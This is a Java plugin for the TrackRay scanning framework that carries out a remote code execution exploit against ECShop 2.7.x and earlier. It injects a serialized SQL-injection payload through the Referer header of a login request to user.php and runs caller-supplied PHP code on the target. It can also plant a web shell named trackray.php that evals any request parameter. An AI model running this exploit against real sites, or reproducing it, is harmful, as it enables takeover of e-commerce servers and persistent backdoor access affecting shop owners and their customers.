package com.trackray.module.plugin.webapp.ecshop;

import com.trackray.base.annotation.Plugin;
import com.trackray.base.annotation.Param;
import com.trackray.base.annotation.Rule;
import com.trackray.base.enums.HttpMethod;
import com.trackray.base.plugin.AbstractPlugin;
import com.trackray.base.plugin.CommonPlugin;
import org.apache.http.message.BasicHeader;

import java.util.HashMap;
import java.util.Map;

@Plugin(value = "ecshop001",
        title = "ECShop <= 2.7.x 全系列版本远程代码执行",
        author = "blue",
        desc = "url=http://xx.com/&code=phpinfo();exit;&isShell=false",
        link = "http://dwz.cn/XZN5HMBN")
@Rule(params = {
                @Param(key = "url", desc = "user.php目录下的地址"),
                @Param(key = "code",defaultValue = "phpinfo();" , desc = "执行的代码"),
                @Param(key = "isShell",defaultValue = "false" , desc = "是否自动getshell"),},
        type = AbstractPlugin.Type.HTML )
public class ECShop001 extends CommonPlugin<String> {
    @Override
    public boolean check(Map<String, Object> param) {
        return !param.isEmpty();
    }

    @Override
    public String start() {
        String url = param.get("url").toString();
        String code = param.get("code").toString();;
        String isShell = param.get("isShell").toString();;


        String payload = "554fcae493e564ee0dc75bdf2ebf94caads|a:3:{s:2:\"id\";s:3:\"'/*\";s:3:\"num\";s:201:\"*/ union select 1,0x272F2A,3,4,5,6,7,8,0x7b247b2476756c6e737079275d3b6576616c2f2a2a2f286261736536345f6465636f646528275a585a686243676b5831425055315262646e5673626e4e77655630704f773d3d2729293b2f2f7d7d,0--\";s:4:\"name\";s:3:\"ads\";}554fcae493e564ee0dc75bdf2ebf94ca";
        String getshell = "eval(base64_decode($_POST[d]));exit;";

        crawlerPage.getRequest().setUrl(url+"/user.php");
        crawlerPage.getRequest().setHttpMethod(HttpMethod.POST);
        HashMap<String, String> map = new HashMap<>();
        map.put("action","login");
        if (isShell.contains("true") || isShell.equals("1")) {
            map.put("vulnspy", getshell);
            map.put("d","ZmlsZV9wdXRfY29udGVudHMoJ3RyYWNrcmF5LnBocCcsJzw/cGhwIGV2YWwoJF9SRVFVRVNUW3hdKTs/PicpOw==");
        }else {
            map.put("vulnspy", code);
        }
        crawlerPage.getRequest().setParamMap(map);
        crawlerPage.getRequest().addHttpHeader(new BasicHeader("Referer",payload));
        fetcher.run(crawlerPage);

        String content = crawlerPage.getResponse().getStatus().getContent();
        if (content.contains("{$") && content.length() < 10){
            return url+"/trackray.php?x=phpinfo()";
        }else {
            return content;
        }

    }
}
